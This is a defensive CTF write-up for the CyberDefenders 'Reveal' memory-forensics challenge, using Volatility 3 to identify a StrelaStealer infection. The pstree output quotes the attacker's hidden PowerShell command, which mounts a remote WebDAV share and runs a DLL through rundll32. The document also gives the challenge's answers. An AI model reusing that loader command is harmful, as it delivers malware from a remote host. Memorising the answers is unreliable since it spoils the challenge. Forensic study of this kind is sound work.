---
Type: CTF
tags:
 - Type/Atom
 - status/done
 - difficulty/Easy
 - ctf/writeup
 - platform/CyberDefenders
 - Network_Forensics
created: 2025-08-22T21:33
Status: Done
Platform: CyberDefenders
Category: Network Forensics
Tactics: [Defense Evasion, Discovery]
Tools: [Volatility 3]
---

# Reveal

## Overview

You are a forensic investigator at a financial institution, and your SIEM flagged unusual activity on a workstation with access to sensitive financial data. Suspecting a breach, you received a memory dump from the compromised machine. Your task is to analyze the memory for signs of compromise, trace the anomaly's origin, and assess its scope to contain the incident effectively.

---

## Questions / Walkthrough

### 1. Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process?

We'll use `Volatility3` to complete work through this CTF. Volatility is a memory forensics framework used to extract and analyze digital artifacts from volatile memory (RAM) samples. There are guides online on how to install for your target platform.

Once we've downloaded and extracted the `.dmp` file, we can go ahead and use vol3 to analyze it.

We need to find the name of the malicious process, we can use `windows.pslist` or `windows.pstree` to find this.

Scanning through the output, we can see a `powershell.exe` process, hiding the window (`-windowstyle hidden`), mounting a WebDAV share (`net use \\45.9.74.32@8888\davwwwroot\`). And executing a DLL (`3435.dll`). Definitely a suspicious process.

```bash
$ vol3 -f 192-Reveal.dmp windows.pstree | less
...
3692    4120    powershell.exe  0xc90c0358b080  17      -       1       False   2024-07-15 07:00:03.000000 UTC  N/A     \Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
...
```

### 2. Knowing the parent process ID (PPID) of the malicious process aids in tracing the process hierarchy and understanding the attack flow. What is the parent PID of the malicious process?

PPID is the second column (as seen in header row). `4120`

### 3. Determining the file name used by the malware for executing the second-stage payload is crucial for identifying subsequent malicious activities. What is the file name that the malware uses to execute the second-stage payload?

We saw this in question 1: `3435.dll`

### 4. Identifying the shared directory on the remote server helps trace the resources targeted by the attacker. What is the name of the shared directory being accessed on the remote server?

Again, we saw this in question 1: `davwwwroot`

### 5. What is the MITRE ATT&CK sub-technique ID that describes the execution of a second-stage payload using a Windows utility to run the malicious file?

This is just something we can look-up online. Check out [T1218.011](https://attack.mitre.org/techniques/T1218/011/) for more information.

### 6. Identifying the username under which the malicious process runs helps in assessing the compromised account and its potential impact. What is the username that the malicious process runs under?

We can check this with `windows.getsids`, filtering for the PID.

**What is GetSIDS?**
- **Purpose**: It extracts the **Security Identifiers (SIDs)** from the access token associated with each process.
- Every Windows process has an **access token** that defines:
    - Which **user account** it’s running under.
    - Which **groups** it belongs to.
    - What **privileges** are available.
This plugin basically peeks into that token and lists the **SIDs** the process is running with

We can see that the user is `Elon`

```bash
$ vol3 -f 192-Reveal.dmp windows.getsids --pid 3692
Volatility 3 Framework 2.26.2
Progress:  100.00               PDB scanning finished
PID     Process SID     Name

3692    powershell.exe  S-1-5-21-3274565340-3808842250-3617890653-1001  Elon
3692    powershell.exe  S-1-5-21-3274565340-3808842250-3617890653-513   Domain Users
3692    powershell.exe  S-1-1-0 Everyone
3692    powershell.exe  S-1-5-114       Local Account (Member of Administrators)
3692    powershell.exe  S-1-5-32-544    Administrators
3692    powershell.exe  S-1-5-32-545    Users
3692    powershell.exe  S-1-5-4 Interactive
3692    powershell.exe  S-1-2-1 Console Logon (Users who are logged onto the physical console)
3692    powershell.exe  S-1-5-11        Authenticated Users
3692    powershell.exe  S-1-5-15        This Organization
3692    powershell.exe  S-1-5-113       Local Account
3692    powershell.exe  S-1-5-5-0-277248        Logon Session
3692    powershell.exe  S-1-2-0 Local (Users with the ability to log in locally)
3692    powershell.exe  S-1-5-64-10     NTLM Authentication
3692    powershell.exe  S-1-16-12288    High Mandatory Level
```


### 7. Knowing the name of the malware family is essential for correlating the attack with known threats and developing appropriate defenses. What is the name of the malware family?

We have the IP address it connected to to pull the DLL. Let's look that up in [VirusTotal](https://www.virustotal.com/gui/ip-address/45.9.74.32).

We can see this the malware family `STRELASTEALER` reference.

Additionally, we can also look this up in [ThreatFox](https://threatfox.abuse.ch/ioc/1300619/) to get more information.


---

## References

- [CTF Link](https://cyberdefenders.org/blueteam-ctf-challenges/reveal/)